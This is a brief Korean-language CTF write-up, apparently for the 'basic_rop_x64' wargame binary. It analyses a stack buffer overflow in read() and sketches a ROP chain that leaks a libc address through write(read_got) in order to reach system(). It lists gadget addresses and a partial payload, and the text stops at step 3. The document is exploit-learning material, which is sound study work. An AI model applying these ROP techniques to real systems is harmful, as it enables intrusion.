## 프로그램 흐름
    read함수로 buf변수 입력을 받고 write함수로 buf크기만큼 출력이 된다

## 보호기법
arch : amd64
no canary
nx enavled
no pie

## 스택구조
rip     rbp+0x8         8바이트
sfp     rbp            8바이트
buf     rbp-0x40        0x40바이트        
        rbp-0x50

## 취약점 -> 공격
read함수의 입력 크기 값이 buf변수보다 훨씬 더 크기에 bof 발생한다
rip를 조작시켜 쉘을 가져올것이다

## 공격 발상 흐름
bof시켜 rip를 조작한다
주어진 자료는 실행파일의 바이너리 파일을 확인 가능하고 라이브러리 파일이 존재한다
어느 한 바이너리 함수 주소를 알면 라이브러리 주소값과 빼면 오프셋이 구해지고 system()함수 주소를 확인하면 nx우회하여 실행시킨다

## 공격 준비도구
pop rdi     0x400883
pop rsi     0x400881
ret         0x4005a9

## 치팅
    1.ROPgadget --binary ./basic_rop_x64 --re ""
    2.payload += pop_rdi
    payload += p64(1)
    payload += pop_rsi
    payload += p64(read_got)    #plt는 got참조하여 실행하니 got주소 알아야함
    payload += p64(0)
    payload += p64(write_plt)
    3. 